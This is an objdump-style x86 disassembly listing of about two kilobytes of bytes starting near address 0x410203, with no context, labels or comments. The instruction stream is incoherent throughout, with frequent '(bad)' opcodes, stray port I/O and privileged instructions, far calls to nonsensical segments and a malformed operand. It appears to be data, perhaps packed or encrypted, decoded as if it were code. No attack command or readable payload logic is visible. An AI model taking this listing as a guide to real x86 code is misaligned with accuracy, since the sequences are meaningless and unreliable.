  410203:	fisttp WORD PTR [eax+ebp*1]
  410206:	dec    ecx
  410207:	push   cs
  410208:	push   edx
  410209:	or     DWORD PTR [ebx],ebx
  41020b:	(bad)  
  41020c:	fcmovb st,st(4)
  41020e:	xchg   ebp,eax
  41020f:	adc    ah,ah
  410211:	pop    esp
  410212:	mov    edi,0xc66b0dbb
  410217:	xchg   ecx,eax
  410218:	mov    cl,0x24
  41021a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41021b:	mov    dl,0xb1
  41021d:	sub    bl,bh
  41021f:	mov    esi,0xe4bae9eb
  410224:	mov    ebp,0x26c2bbd7
  410229:	xchg   esp,eax
  41022a:	sar    dh,0x69
  41022d:	sub    edx,ebx
  41022f:	imul   ebp,DWORD PTR [ebp+0x121c397d],0x4d
  410236:	sub    ch,BYTE PTR [ecx+0x2f]
  410239:	xor    BYTE PTR [edi],bl
  41023b:	loopne 0x4102aa
  41023d:	addr16 clc 
  41023f:	jl     0x410230
  410241:	mov    ebx,0xa6b1b19
  410246:	xchg   edi,eax
  410247:	js     0x41023d
  410249:	cmp    al,0x14
  41024b:	sti    
  41024c:	xchg   ebp,eax
  41024d:	je     0x4102af
  41024f:	and    al,dl
  410251:	dec    edi
  410252:	cdq    
  410253:	push   ss
  410254:	out    dx,eax
  410255:	pop    ds
  410256:	xchg   ebp,eax
  410258:	sub    BYTE PTR [esi-0xcf9932f],ch
  41025e:	and    al,0xc4
  410260:	sbb    eax,ecx
  410262:	mov    cl,0x87
  410264:	jae    0x4102c9
  410266:	test   al,0xe0
  410268:	cmp    esi,DWORD PTR [edx]
  41026a:	xlat   BYTE PTR ds:[ebx]
  41026b:	mov    ecx,0xf950fe98
  410270:	lds    edi,FWORD PTR [edi-0x64]
  410273:	out    0x7e,eax
  410275:	pusha  
  410276:	cmc    
  410277:	and    eax,0xdf802b8b
  41027c:	inc    edx
  41027d:	or     BYTE PTR [edx-0x2189ba4e],cl
  410283:	retf   
  410284:	aam    0x7a
  410286:	es inc edi
  410288:	aam    0x6c
  41028a:	jns    0x4102cd
  41028c:	out    dx,al
  41028d:	add    DWORD PTR [edi+0x2dd3bc73],ebp
  410293:	mov    bl,0xa9
  410295:	mov    ds:0x55f55aa7,eax
  41029b:	xor    esp,ebx
  41029d:	fidivr WORD PTR [esi]
  41029f:	sbb    al,0x59
  4102a1:	jg     0x4102b6
  4102a3:	inc    ecx
  4102a4:	and    DWORD PTR [esi+0x64],esi
  4102a7:	call   0xd86ce2e4
  4102ac:	(bad)  
  4102ae:	hlt    
  4102af:	or     eax,0x90c7f4c7
  4102b4:	pop    ebp
  4102b5:	push   ds
  4102b6:	cdq    
  4102b7:	jno    0x41028b
  4102b9:	dec    edi
  4102ba:	mov    BYTE PTR [ecx],bl
  4102bc:	data16 adc BYTE PTR [ecx-0x4f],dl
  4102c0:	xchg   esi,eax
  4102c1:	pop    ebp
  4102c2:	clc    
  4102c3:	jecxz  0x410308
  4102c5:	test   ebp,eax
  4102c7:	std    
  4102c8:	mov    BYTE PTR [ebp+eiz*8-0x104e2c40],bh
  4102cf:	push   ebp
  4102d0:	cmp    ch,BYTE PTR [ebx-0x5613c082]
  4102d6:	cwde   
  4102d7:	in     al,0xa
  4102d9:	scas   al,BYTE PTR es:[edi]
  4102da:	xor    BYTE PTR [esi+0x1f],0x53
  4102de:	xchg   ebx,eax
  4102df:	in     eax,0xf6
  4102e1:	leave  
  4102e2:	daa    
  4102e3:	fbstp  TBYTE PTR [ebx+0x5b]
  4102e6:	jae    0x410318
  4102e8:	stc    
  4102e9:	mov    WORD PTR [esi],ss
  4102eb:	out    dx,eax
  4102ec:	jnp    0x410331
  4102ee:	or     eax,0x510ae29e
  4102f3:	mov    esp,0x40fb6fe0
  4102f8:	lea    edx,[ecx]
  4102fa:	call   0x205b:0x8abfc19d
  410301:	mov    ah,0x33
  410303:	mov    bh,0x8e
  410305:	xchg   edi,eax
  410306:	cmp    eax,0xac70cb25
  41030b:	jecxz  0x410298
  41030d:	and    BYTE PTR [esp+edi*4+0x24],bl
  410311:	mov    edx,0x2a6d7080
  410316:	pop    edi
  410317:	xor    eax,0xdaa5623c
  41031c:	bound  esi,QWORD PTR [eax+0x32b7dcd2]
  410322:	iret   
  410323:	inc    esi
  410324:	(bad)  
  410326:	push   es
  410327:	sub    eax,0x62a98520
  41032c:	sub    ah,BYTE PTR [ebp-0x73]
  41032f:	mov    ecx,0xe6ddb86b
  410334:	les    edx,FWORD PTR [ebx]
  410336:	mov    bl,dl
  410338:	jnp    0x410357
  41033a:	cmp    bh,BYTE PTR [esi]
  41033c:	aaa    
  41033d:	inc    ecx
  41033e:	mov    WORD PTR [edx-0x785a55c5],fs
  410344:	inc    edx
  410345:	fdiv   QWORD PTR [ebx]
  410347:	jno    0x410301
  410349:	sbb    DWORD PTR [edi-0x4e],edx
  41034c:	mov    eax,ds:0xf2254e5e
  410351:	xchg   edi,eax
  410352:	xchg   edx,eax
  410353:	subps  xmm6,XMMWORD PTR [esi+0x6f]
  410357:	mov    eax,ds:0x3c50cf2d
  41035c:	mov    bl,0xb2
  41035e:	fwait
  41035f:	cvtdq2ps xmm6,XMMWORD PTR [ebp-0x6cbee7d2]
  410366:	mov    ebx,0x194c3cd5
  41036b:	inc    edx
  41036c:	push   0x8a7bb4f3
  410371:	out    dx,al
  410372:	and    eax,0x6da8bb91
  410377:	ja     0x4103b8
  410379:	test   DWORD PTR [eax-0x426e548a],esi
  41037f:	in     eax,0x4e
  410381:	outs   dx,BYTE PTR ds:[esi]
  410382:	fistp  QWORD PTR [edx+0x38b608e6]
  410388:	add    DWORD PTR [edi+0x73],0xffffffa6
  41038c:	adc    DWORD PTR [eax+0x73],ecx
  41038f:	mov    dh,0xb4
  410391:	sbb    esp,DWORD PTR ds:0x601ba733
  410397:	adc    DWORD PTR [edx-0x2b824890],esi
  41039d:	cmp    al,0x98
  41039f:	cli    
  4103a0:	dec    esp
  4103a1:	retf   0x2bdd
  4103a4:	sub    bl,bl
  4103a6:	mov    al,ds:0xa8e352b1
  4103ab:	sbb    ah,bl
  4103ad:	push   ss
  4103ae:	ret    
  4103af:	mul    DWORD PTR [edx]
  4103b1:	pop    es
  4103b2:	and    eax,0x44336e22
  4103b7:	add    dh,0xe8
  4103ba:	int    0x51
  4103bc:	mov    ss,WORD PTR [eax-0x1527036a]
  4103c2:	aad    0x8a
  4103c4:	cdq    
  4103c5:	cmp    DWORD PTR [edx+0x70dd2aa4],ebx
  4103cb:	in     al,0x2a
  4103cd:	add    BYTE PTR [ecx-0x46],dh
  4103d0:	test   DWORD PTR [esi*8+0x54b9819a],esi
  4103d7:	imul   ebp,DWORD PTR [edi-0x1e],0x1
  4103db:	lods   al,BYTE PTR ds:[esi]
  4103dc:	sbb    bh,ah
  4103de:	cli    
  4103df:	scas   eax,DWORD PTR es:[edi]
  4103e0:	dec    ebp
  4103e1:	iretw  
  4103e3:	or     eax,0xf39527b
  4103e8:	sub    eax,0x7ae78890
  4103ed:	dec    ecx
  4103ee:	fcomip st,st(1)
  4103f0:	sub    ebp,0xed4a8437
  4103f6:	and    eax,0x563942bf
  4103fb:	xchg   ecx,eax
  4103fc:	ja     0x41042c
  4103fe:	stc    
  4103ff:	mov    ebx,0x2f09a160
  410404:	push   esi
  410405:	and    eax,0x330861de
  41040a:	adc    ecx,DWORD PTR [eax]
  41040c:	in     al,dx
  41040d:	push   edi
  41040e:	and    al,0x4c
  410410:	or     dh,BYTE PTR ds:0xdbd9491f
  410416:	aaa    
  410417:	add    eax,0xc42af7f7
  41041c:	jge    0x4103db
  41041e:	xor    ah,BYTE PTR [ecx+ebx*4]
  410421:	adc    eax,0x9cd2f46
  410426:	pop    ecx
  410427:	idiv   DWORD PTR [eax+esi*2+0x47]
  41042b:	pop    ds
  41042c:	ficom  DWORD PTR [ebx-0x23fa7b67]
  410432:	sar    DWORD PTR [ebx],cl
  410434:	or     esi,ecx
  410436:	dec    ebp
  410437:	imul   esp,edi,0xffffffd5
  41043a:	scas   eax,DWORD PTR es:[edi]
  41043b:	mov    dl,0x63
  41043d:	out    dx,al
  41043e:	xchg   ebx,ebx
  410440:	retf   
  410441:	adc    al,0xc5
  410443:	retf   0xef58
  410446:	mov    BYTE PTR [edx+0x1b],cl
  410449:	mov    edx,0x73431041
  41044e:	mov    eax,DWORD PTR [edi]
  410450:	mov    ecx,0xd4af94ad
  410455:	lahf   
  410456:	test   eax,0x289984ef
  41045b:	inc    esp
  41045c:	cmp    BYTE PTR [esi+0x79bf38e3],al
  410462:	psrlq  mm1,mm1
  410465:	adc    eax,0xd15d21d9
  41046a:	fisubr WORD PTR [ecx]
  41046c:	xchg   DWORD PTR [ebp+0x31ae7386],edx
  410472:	pop    ecx
  410473:	dec    esi
  410474:	iret   
  410475:	scas   al,BYTE PTR es:[edi]
  410476:	mov    ds:0x640c094d,eax
  41047b:	in     eax,0x3d
  41047d:	jo     0x410426
  41047f:	test   BYTE PTR [eax+0x67],bl
  410482:	mov    eax,0x84241261
  410487:	cmp    edx,DWORD PTR [ebp+eiz*8-0x56]
  41048b:	(bad)  
  41048c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41048d:	mov    ecx,DWORD PTR [edx+edi*2+0x12]
  410491:	int3   
  410492:	mov    esp,0x4088bc37
  410497:	out    dx,al
  410498:	mov    ds:0x5143cbdd,eax
  41049d:	inc    eax
  41049e:	mov    eax,ds:0xf6c427b3
  4104a3:	xor    bl,BYTE PTR [ecx+0x27178e80]
  4104a9:	addr16 pushf 
  4104ab:	out    0xe5,al
  4104ad:	xchg   ebx,eax
  4104ae:	ss push ds
  4104b0:	int    0xee
  4104b2:	fld    TBYTE PTR ds:0xc873227
  4104b8:	mov    esp,0xd8886d9b
  4104bd:	mov    cl,0x2b
  4104bf:	add    al,0x8c
  4104c1:	ins    BYTE PTR es:[edi],dx
  4104c2:	sti    
  4104c3:	jmp    0xeaff7a9a
  4104c8:	inc    ecx
  4104c9:	arpl   WORD PTR ds:0xb1c2712f,bp
  4104cf:	(bad)  [edi-0x1486fbec]
  4104d5:	jno    0x41046f
  4104d7:	dec    esp
  4104d8:	ja     0x410545
  4104da:	cwde   
  4104db:	sbb    BYTE PTR [ebp+edi*2+0x43bc7889],bl
  4104e2:	adc    eax,0x5057e0a6
  4104e7:	(bad)  [ebx-0x54]
  4104ea:	mov    ch,0x24
  4104ec:	ret    
  4104ed:	int    0xec
  4104ef:	xchg   edx,eax
  4104f0:	loopne 0x4104bc
  4104f2:	mov    bl,BYTE PTR [edx-0x5]
  4104f5:	mov    ah,0x5c
  4104f7:	add    DWORD PTR [eax-0x1b],ebx
  4104fa:	add    al,0x2b
  4104fc:	mov    edx,0xdb3addf0
  410501:	mov    eax,ds:0xb051bd63
  410506:	int    0x4a
  410508:	xor    BYTE PTR [ebx+esi*2-0x2941096f],dl
  41050f:	out    0x63,eax
  410511:	adc    eax,0xe059dd64
  410516:	add    BYTE PTR [edx],ah
  410518:	(bad)  
  410519:	std    
  41051a:	sbb    edx,ebp
  41051c:	sbb    dh,ah
  41051e:	stc    
  41051f:	dec    edi
  410520:	xchg   edi,eax
  410521:	cmp    DWORD PTR [ebp+0x74],edi
  410524:	sbb    eax,0x71d12256
  410529:	push   ds
  41052a:	js     0x41053b
  41052c:	xchg   esi,eax
  41052d:	fstp   DWORD PTR [esi+edi*2+0x655c2658]
  410534:	leave  
  410535:	aas    
  410536:	inc    esp
  410537:	int    0x6a
  410539:	add    BYTE PTR [eax-0x4795416e],cl
  41053f:	add    ecx,DWORD PTR [ebp+0x6f744c6c]
  410545:	push   edx
  410546:	out    0x87,eax
  410548:	mov    ebp,0x3e4d10d5
  41054d:	mov    al,ds:0x5c38aa3d
  410552:	or     BYTE PTR [ecx-0x3d],0x91
  410556:	out    dx,al
  410557:	pop    eax
  410558:	xor    bh,BYTE PTR [esi]
  41055a:	sub    eax,0xe52e3f38
  41055f:	mov    ch,0x83
  410561:	repnz sbb eax,0x42b7be1
  410567:	cmp    eax,0xd9f9be2b
  41056c:	repnz xor al,0xdf
  41056f:	mov    bl,0x2a
  410571:	xor    eax,0x6fec2fd3
  410576:	jno    0x410566
  410578:	and    eax,0x4824e326
  41057d:	(bad)  
  41057e:	mov    eax,0x78ee7a2c
  410583:	sub    ah,BYTE PTR [ecx-0x5c]
  410586:	les    eax,FWORD PTR [edi]
  410588:	shl    esp,cl
  41058a:	fdivp  st(3),st
  41058c:	je     0x410549
  41058e:	mov    cl,BYTE PTR [eax-0x32145ed7]
  410594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410595:	stos   BYTE PTR es:[edi],al
  410596:	les    eax,FWORD PTR [ebp+0x62]
  410599:	xchg   edi,eax
  41059a:	xchg   edx,eax
  41059b:	adc    al,0x25
  41059d:	test   ch,cl
  41059f:	sub    eax,0x8ea6916e
  4105a4:	adc    eax,0xdcecd6c4
  4105a9:	or     BYTE PTR [edi+eax*8],dh
  4105ac:	inc    DWORD PTR ds:0x3cb4119f
  4105b2:	jmp    0x410571
  4105b4:	imul   edi,DWORD PTR [eax],0x2c6411e9
  4105ba:	push   ebp
  4105bb:	mov    ch,0xd3
  4105bd:	enter  0x7c4e,0xd
  4105c1:	sbb    bh,al
  4105c3:	pusha  
  4105c4:	aad    0x19
  4105c6:	stc    
  4105c7:	mov    ?,WORD PTR [ebp+0x1f249180]
  4105cd:	int    0xef
  4105cf:	and    cl,BYTE PTR [ecx]
  4105d1:	jecxz  0x4105f1
  4105d3:	les    ebx,FWORD PTR [ecx+0x642a3a63]
  4105d9:	rcl    DWORD PTR [ebx],0x16
  4105dc:	cmc    
  4105dd:	add    BYTE PTR [edi],ch
  4105df:	mov    eax,ds:0xc32d171f
  4105e4:	(bad)  
  4105e5:	xchg   ecx,eax
  4105e6:	and    eax,0x6c72ad46
  4105eb:	fcom   QWORD PTR [ecx-0x48]
  4105ee:	inc    esp
  4105ef:	adc    BYTE PTR [esp+eax*1],al
  4105f2:	loop   0x41060f
  4105f4:	xor    DWORD PTR [ebx-0x77820d1f],ebx
  4105fa:	ficomp DWORD PTR [edi-0x5ffd677c]
  410600:	xlat   BYTE PTR ds:[ebx]
  410601:	and    al,0x71
  410603:	cmp    ecx,DWORD PTR [edx+0x78e18320]
  410609:	and    al,BYTE PTR [edx-0x49]
  41060c:	jae    0x410647
  41060e:	ss pop esi
  410610:	sub    al,0x8c
  410612:	and    al,0xbf
  410614:	ins    BYTE PTR es:[edi],dx
  410615:	ss jbe 0x41060f
  410618:	adc    ah,BYTE PTR [edx+0x5731fa5]
  41061e:	es je  0x4105fd
  410621:	cld    
  410622:	jg     0x4105e3
  410624:	mov    dh,0x3b
  410626:	sub    BYTE PTR [edx+0x6f0c89ac],cl
  41062c:	fsub   QWORD PTR fs:[eax+0x392ffda6]
  410633:	and    al,dh
  410635:	mov    ch,0xbb
  410637:	or     BYTE PTR [edx-0x2d],dh
  41063a:	pop    ebp
  41063b:	shl    bl,1
  41063d:	sbb    BYTE PTR [ebx+0x39],bl
  410640:	imul   edx,ebx,0xffffffc3
  410643:	xchg   edi,eax
  410644:	or     eax,0x4049df75
  410649:	ins    BYTE PTR es:[edi],dx
  41064a:	push   0xffffffbd
  41064c:	mov    cl,0x57
  41064e:	rcl    BYTE PTR [ebp-0x33b1470f],cl
  410654:	sbb    al,0x2d
  410656:	stos   BYTE PTR es:[edi],al
  410657:	mov    ch,0x63
  410659:	dec    edx
  41065a:	jnp    0x4105e9
  41065c:	(bad)  
  41065d:	cmp    BYTE PTR [ebp-0x13],bh
  410660:	dec    esi
  410661:	jmp    DWORD PTR [eax+ecx*1]
  410664:	and    ah,dh
  410666:	xor    DWORD PTR cs:[edi-0x4d17ab47],edx
  41066d:	pusha  
  41066e:	xor    al,0xd7
  410670:	xor    eax,0x179aba67
  410675:	sbb    edx,DWORD PTR [ecx-0x1f9489da]
  41067b:	push   ss
  41067c:	cs addr16 sti 
  41067f:	icebp  
  410680:	cmp    eax,0x3ae918
  410685:	popa   
  410686:	std    
  410687:	pop    ecx
  410688:	pushf  
  410689:	sbb    dl,dl
  41068b:	cld    
  41068c:	dec    esp
  41068d:	or     eax,DWORD PTR [edi]
  41068f:	push   0xffffffdc
  410691:	stos   BYTE PTR es:[edi],al
  410692:	js     0x4106dc
  410694:	jnp    0x410690
  410696:	aas    
  410697:	or     edi,0xffffff8b
  41069a:	inc    esp
  41069b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41069c:	jno    0x410682
  41069e:	dec    ebp
  41069f:	xor    DWORD PTR [edx-0x1b50ca4a],esp
  4106a5:	loop   0x410711
  4106a7:	inc    ecx
  4106a8:	test   DWORD PTR [ebx],ecx
  4106aa:	jl     0x41065f
  4106ac:	out    dx,al
  4106ad:	or     BYTE PTR [eax],al
  4106af:	aas    
  4106b0:	jne    0x41068e
  4106b2:	pop    ecx
  4106b3:	fwait
  4106b4:	jbe    0x4106fa
  4106b6:	mov    DWORD PTR [edi],edi
  4106b8:	mov    edx,0x1fc16cbb
  4106be:	pop    es
  4106bf:	push   esi
  4106c0:	(bad)  
  4106c1:	and    esp,DWORD PTR [ecx+0x41]
  4106c4:	push   esp
  4106c5:	jp     0x410665
  4106c7:	gs nop
  4106c9:	(bad)  
  4106ca:	xlat   BYTE PTR ds:[ebx]
  4106cb:	test   eax,0x40253dde
  4106d0:	xchg   BYTE PTR [ebp-0x3ac30032],bl
  4106d6:	out    0xf3,al
  4106d8:	mov    ds:0x7dc7b5d9,eax
  4106dd:	push   cs
  4106de:	popa   
  4106df:	sub    eax,0x382552ce
  4106e4:	push   esi
  4106e5:	daa    
  4106e6:	push   cs
  4106e7:	cmp    DWORD PTR [edx+0x37862777],0xffffffaf
  4106ee:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106f0:	shl    al,1
  4106f2:	push   ds
  4106f3:	inc    ecx
  4106f4:	(bad)  
  4106f5:	in     al,dx
  4106f6:	cld    
  4106f7:	ins    BYTE PTR es:[edi],dx
  4106f8:	mov    dl,0x2a
  4106fa:	ret    
  4106fb:	xlat   BYTE PTR ds:[ebx]
  4106fc:	and    DWORD PTR [edi],ecx
  4106fe:	xchg   dx,ax
  410700:	push   edx
  410701:	ficom  WORD PTR [esi+0x45a2a762]
  410707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410708:	leave  
  410709:	xor    al,BYTE PTR [eax+0x51cc5658]
  41070f:	pop    ds
  410710:	dec    edi
  410711:	hlt    
  410712:	inc    edi
  410713:	push   esp
  410714:	mov    edx,0xd055cad1
  410719:	(bad)
  41071d:	adc    ebx,esp
  41071f:	(bad)  
  410720:	rcr    DWORD PTR [edx+0x41f6d83e],1
  410726:	jb     0x41072e
  410728:	mov    eax,0x34251b57
  41072d:	out    0x7,al
  41072f:	mov    ebx,0xd84239cc
  410734:	pop    eax
  410735:	idiv   DWORD PTR [ebx+0x57]
  410738:	cli    
  410739:	push   ss
  41073a:	(bad)  
  41073b:	xor    bh,BYTE PTR [eax-0x57]
  41073e:	inc    ebp
  41073f:	hlt    
  410740:	xchg   edx,eax
  410741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410742:	jne    0x4106c6
  410744:	mov    ecx,0x2f58b559
  410749:	repnz xchg esi,eax
  41074b:	and    eax,0x3686fa0b
  410750:	inc    edx
  410751:	test   eax,0xf959441b
  410756:	jge    0x4106dd
  410758:	test   al,0x7a
  41075a:	bound  ax,DWORD PTR [ecx]
  41075d:	imul   ecx,DWORD PTR [eax+0x52fb2659],0x992b8033
  410767:	nop
  410768:	mov    bh,cl
  41076a:	push   ss
  41076b:	(bad)  
  41076c:	cmp    ebp,DWORD PTR [esi-0xf]
  41076f:	scas   eax,DWORD PTR es:[edi]
  410770:	and    edi,DWORD PTR [ebp+0x5e]
  410773:	jecxz  0x41077d
  410775:	cmp    edi,0xffffff9a
  410778:	nop
  410779:	push   0x70
  41077b:	or     al,BYTE PTR [ebp+0x2d]
  41077e:	rol    BYTE PTR [edx-0x34],0xde
  410782:	or     ch,cl
  410784:	(bad)  
  410785:	sti    
  410786:	dec    edi
  410787:	ins    DWORD PTR es:[edi],dx
  410788:	cld    
  410789:	mov    ebx,0xc213f081
  41078e:	test   bh,bl
  410790:	mov    ebp,0x95b69e16
  410795:	ret    0x41d4
  410798:	mov    al,ds:0xf731c29
  41079d:	imul   ebx,DWORD PTR [edi+0x57],0x1
  4107a1:	dec    edx
  4107a2:	loop   0x410749
  4107a4:	inc    ecx
  4107a5:	(bad)  
  4107a6:	jb     0x4107d8
  4107a8:	in     eax,dx
  4107a9:	jge    0x410755
  4107ab:	xchg   ecx,eax
  4107ac:	adc    ebx,eax
  4107ae:	or     ebp,DWORD PTR ds:0xfabe2ed6
  4107b4:	call   0x373b:0xdf82f38e
  4107bb:	push   eax
  4107bc:	dec    esp
  4107bd:	sub    eax,0x595dbffb
  4107c2:	add    ebp,DWORD PTR [ebx]
  4107c4:	jmp    0x41082d
  4107c6:	jmp    FWORD PTR [ecx+0x64a7e6dd]
  4107cc:	pop    ecx
  4107cd:	outs   dx,BYTE PTR ds:[esi]
  4107ce:	les    edx,FWORD PTR [esi]
  4107d0:	mov    esi,0xc2cd1f0
  4107d5:	and    BYTE PTR [ebx+ebp*1-0x16749841],0x1d
  4107dd:	icebp  
  4107de:	jbe    0x41084c
  4107e0:	mov    WORD PTR [edx+0x5e],gs
  4107e3:	xor    ecx,DWORD PTR [edi]
  4107e5:	xchg   ebx,eax
  4107e6:	pop    ss
  4107e7:	das    
  4107e8:	adc    DWORD PTR [ebx],ebp
  4107ea:	out    0x88,al
  4107ec:	mov    dl,ah
  4107ee:	sar    BYTE PTR [edx-0x38b2e0],0x7d
  4107f5:	push   0x8e47d6
  4107fa:	push   0xed05587
  4107ff:	enter  0x286d,0xb4
  410803:	fdiv   st,st(7)
  410805:	lods   al,BYTE PTR fs:[esi]
  410807:	add    edx,DWORD PTR [ecx]
  410809:	sbb    al,0x35
  41080b:	popf   
  41080c:	xchg   esp,eax
  41080d:	int3   
  41080e:	shr    BYTE PTR [ecx-0xa],cl
  410811:	ror    DWORD PTR [ecx-0x18],0xa8
  410815:	inc    esi
  410816:	aas    
  410817:	(bad)  
  410818:	aaa    
  410819:	gs imul esp,esi,0xfb66f2c3
  410820:	dec    edx
  410821:	pop    ecx
  410822:	into   
  410823:	push   ebx
  410824:	mov    eax,0xf9b1e93a
  410829:	push   0xffffff83
  41082b:	aaa    
  41082c:	rol    BYTE PTR [edi+0x4bc11702],1
  410832:	mov    ds:0x135bd88b,eax
  410837:	push   edx
  410838:	cld    
  410839:	lea    ebp,[esi-0x787908d2]
  41083f:	jecxz  0x4108a3
  410841:	int    0xb0
  410843:	push   0xffffffbe
  410845:	jns    0x4108a3
  410847:	imul   ebx,ecx,0xdfb407e3
  41084d:	sti    
  41084e:	test   eax,0xf5486aa4
  410853:	pop    eax
  410854:	repz cmp eax,DWORD PTR [edi-0xb]
  410858:	xchg   edi,eax
  410859:	jle    0x41085d
  41085b:	cwde   
  41085c:	(bad)  
  41085d:	and    BYTE PTR [ecx],bh
  41085f:	(bad)  
  410860:	out    dx,eax
  410861:	mov    eax,ds:0xa9e129e0
  410866:	test   al,0xdd
  410868:	adc    ebx,DWORD PTR [edx+esi*4+0x47]
  41086c:	into   
  41086d:	jge    0x410883
  41086f:	push   esp
  410870:	out    dx,al
  410871:	and    al,0xcb
  410873:	scas   eax,DWORD PTR es:[edi]
  410874:	lea    edi,[esi]
  410876:	(bad)  
  410878:	cld    
  410879:	xor    al,0xb7
  41087b:	fadd   DWORD PTR [ebx+0x2704870d]
  410881:	js     0x410822
  410883:	stc    
  410884:	je     0x410899
  410886:	xchg   edi,eax
  410887:	fistp  WORD PTR [esp+eiz*8+0x34]
  41088b:	jae    0x41090b
  41088d:	fnstenv [ebp-0x4]
  410890:	dec    edx
  410891:	or     al,0xdc
  410893:	and    eax,0x2dea5b19
  410898:	jo     0x410908
  41089a:	adc    eax,0xda54d4ee
  41089f:	(bad)  
  4108a0:	data16 idiv BYTE PTR [ecx-0x17]
  4108a4:	xor    esi,DWORD PTR [ebx]
  4108a6:	int    0xdd
  4108a8:	mov    dh,0x3e
  4108aa:	push   ss
  4108ab:	jle    0x410872
  4108ad:	test   BYTE PTR [edi+eiz*4-0x5d],0x12
  4108b2:	or     al,0xd2
  4108b4:	push   ebx
  4108b5:	and    al,0xdc
  4108b7:	mov    eax,0x20737ac0
  4108bc:	jae    0x410845
  4108be:	aas    
  4108bf:	sbb    ebx,DWORD PTR ds:0x2ef30c9f
  4108c5:	cdq    
  4108c6:	push   ecx
  4108c7:	(bad)  
  4108c8:	rcl    DWORD PTR [eax+0x5a],1
  4108cb:	add    al,0xe8
  4108cd:	fld    DWORD PTR [ecx-0x1c]
  4108d0:	out    0x10,al
  4108d2:	mov    al,ds:0x4ba4b0e3
  4108d7:	fidiv  WORD PTR [edi]
  4108d9:	ja     0x410955
  4108db:	daa    
  4108dc:	push   eax
  4108dd:	push   es
  4108de:	jbe    0x4108a6
  4108e0:	xchg   ecx,eax
  4108e1:	cmp    eax,DWORD PTR [ebp-0x12]
  4108e4:	mul    bl
  4108e6:	imul   edx,DWORD PTR [esi],0xffffffdc
  4108e9:	fst    DWORD PTR [edi-0x791be461]
  4108ef:	lock call 0x7f7e5430
  4108f5:	test   BYTE PTR [esi],cl
  4108f7:	dec    ebx
  4108f8:	push   ds
  4108f9:	and    al,0xd5
  4108fb:	mov    bh,0x62
  4108fd:	int3   
  4108fe:	out    dx,eax
  4108ff:	and    eax,0xcea19c01
  410904:	in     al,0xd9
  410906:	sub    ch,ah
  410908:	sbb    al,0xcc
  41090a:	into   
  41090b:	cmp    al,0xbc
  41090d:	hlt    
  41090e:	retf   0x4c22
  410911:	jmp    0x908f:0xa6aa1d90
  410918:	ins    DWORD PTR es:[edi],dx
  410919:	pop    ss
  41091a:	out    0x21,al
  41091c:	pusha  
  41091d:	icebp  
  41091e:	jnp    0x410937
  410920:	mov    al,ds:0xfd356269
  410925:	xor    eax,0x3a3f0a03
  41092a:	ja     0x41090a
  41092c:	(bad)  
  41092d:	inc    ebx
  41092e:	dec    eax
  41092f:	inc    ebx
  410930:	jmp    0xc1fd:0x5942c6ca
  410937:	pop    ss
  410938:	jne    0x4108bf
  41093a:	cmc    
  41093b:	mov    edi,0x12c310bb
  410940:	popa   
  410941:	out    0xc1,al
  410943:	in     al,dx
  410944:	or     DWORD PTR [ecx+0x7d],edi
  410947:	or     DWORD PTR [edx-0x60],ebx
  41094a:	lods   al,BYTE PTR ds:[esi]
  41094b:	jo     0x4109c7
  41094d:	sti    
  41094e:	add    ecx,DWORD PTR [edi+0x56]
  410951:	push   ebx
  410952:	xchg   dl,bl
  410954:	es enter 0x496b,0xf1
  410959:	push   es
  41095a:	or     ebx,DWORD PTR [esi+edx*4+0x75b09ae4]
  410961:	loop   0x4109ad
  410963:	out    0x58,eax
  410965:	aaa    
  410966:	or     al,0x37
  410968:	sub    ebp,ebx
  41096a:	(bad)  
  41096b:	in     eax,0xa3
  41096d:	xchg   edx,eax
  41096e:	cmp    esi,DWORD PTR [edx]
  410970:	cs ret 0xa1a
  410974:	xor    ebp,ebx
  410976:	rcr    BYTE PTR ds:0xd005b244,0xf6
  41097d:	xchg   BYTE PTR [edi],al
  41097f:	fs jne 0x410949
  410982:	adc    eax,0x4ab9fa24
  410987:	aam    0xd3
  410989:	push   0x28
  41098b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41098c:	test   eax,0x7c3701a6
  410992:	lods   al,BYTE PTR ds:[esi]
  410993:	into   
  410994:	es push es
  410996:	nop
  410997:	xor    DWORD PTR [eax+0x58efab47],ecx
  41099d:	mov    ah,0xf5
  41099f:	dec    ebp
  4109a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109a1:	xchg   esp,eax
  4109a2:	out    0xf9,al
  4109a4:	mov    ebp,0x724efe6e
  4109a9:	std    
  4109aa:	shl    cl,0x38
  4109ad:	test   al,0xc1
  4109af:	daa    
  4109b0:	or     BYTE PTR [ecx+edi*1],cl
  4109b3:	mov    ebp,0xf472f4c3
  4109b8:	add    eax,eax
  4109ba:	dec    edx
  4109bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109bc:	xchg   ecx,eax
  4109bd:	and    eax,0x3c41e4f2
  4109c2:	xor    BYTE PTR [edi-0x40],0xcc
  4109c6:	leave  
  4109c7:	out    0x4f,al
  4109c9:	pop    edx
  4109ca:	xor    ah,cl
  4109cc:	cdq    
  4109cd:	retf   0xccf8
  4109d0:	sbb    al,0x5d
  4109d2:	fwait
  4109d3:	push   esp
  4109d4:	(bad)  
  4109d5:	push   edx
  4109d6:	cwde   
  4109d7:	adc    ecx,DWORD PTR [esi-0x2a]
  4109da:	cmp    dh,BYTE PTR [edx+edx*4+0x47]
  4109de:	ss push ecx
  4109e0:	pusha  
  4109e1:	retf   0xdb83
  4109e4:	leave  
  4109e5:	das    
  4109e6:	sbb    eax,0xd09f0258
  4109eb:	dec    ecx
  4109ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109ed:	jns    0x410a20
  4109ef:	jl     0x4109d8
  4109f1:	lds    edx,FWORD PTR [ebp-0x7a]
  4109f4:	jne    0x4109d8
  4109f6:	in     eax,0xd0
  4109f8:	in     eax,0x4c
  4109fa:	cli    
  4109fb:	mov    bh,0x4b
  4109fd:	mov    al,ds:0xa39b50f2
  410a02:	dec    ebx
  410a03:	call   0xf5e2c94b
  410a08:	xchg   DWORD PTR [edx],ebx
  410a0a:	sahf   
  410a0b:	dec    esp
